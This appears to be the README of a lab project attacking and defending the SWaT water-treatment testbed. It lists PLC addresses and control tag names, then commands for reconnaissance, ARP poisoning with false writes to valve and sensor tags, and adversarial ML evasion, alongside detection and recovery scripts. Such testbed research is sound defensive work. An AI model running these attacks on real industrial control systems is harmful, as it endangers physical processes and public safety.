# SWaT Attack & Defense Scripts

**Protocol: EtherNet/IP / Allen-Bradley ControlLogix**
**Library: pylogix (confirmed from lab reference script)**
**PLC1: 192.168.1.10  |  PLC1B: 192.168.1.11**

## Dependencies
```bash
pip install pylogix scapy torch numpy pandas scikit-learn
```

## Real SWaT P1 Tag Names (confirmed from lab)
| Signal | Tag | Type |
|--------|-----|------|
| LIT101 level | `HMI_LIT101.Pv` | REAL (mm) |
| FIT101 flow | `AI_FIT_101_FLOW` | REAL (L/s) |
| MV101 valve cmd | `HMI_MV101.Cmd` | INT (1=CLOSE, 2=OPEN) |
| MV101 auto mode | `HMI_MV101.Auto` | BOOL |
| P101 auto mode | `HMI_P101.Auto` | BOOL |
| LIT101 sim enable | `HMI_LIT101.Sim` | BOOL |
| LIT101 sim value | `HMI_LIT101.Sim_PV` | REAL |

## PLC IP Addresses
| PLC | Primary | Redundant |
|-----|---------|-----------|
| PLC1 | 192.168.1.10 | 192.168.1.11 |
| PLC2 | 192.168.1.20 | 192.168.1.21 |
| PLC3 | 192.168.1.30 | 192.168.1.31 |

## Attack
```bash
# Phase 0: recon + tag poll
sudo python3 attack/phase0_recon.py --plc-ip 192.168.1.10 --iface eth0 --duration 1800

# Phase 1: ARP poison + false tag writes
sudo python3 attack/phase1_inject.py --plc-ip 192.168.1.10 --hmi-ip <HMI_IP> \
    --iface eth0 --duration 120

# Phase 2: adversarial ML evasion
python3 attack/phase2_spoof.py train  --data assets/19-Feb-2026_0930_1735.csv
python3 attack/phase2_spoof.py attack --plc-ip 192.168.1.10 --duration 120
```

## Defense
```bash
python3 defense/invariant_checker.py --plc-ip 192.168.1.10
python3 defense/autoencoder_detector.py monitor --plc-ip 192.168.1.10 --model ae_model.pt
python3 defense/fusion.py
```

## Recovery
```bash
python3 recovery/recovery_agent.py --plc-ip 192.168.1.10 --plc-b-ip 192.168.1.11 \
    --attacker-ip <ATTACKER_IP>
```
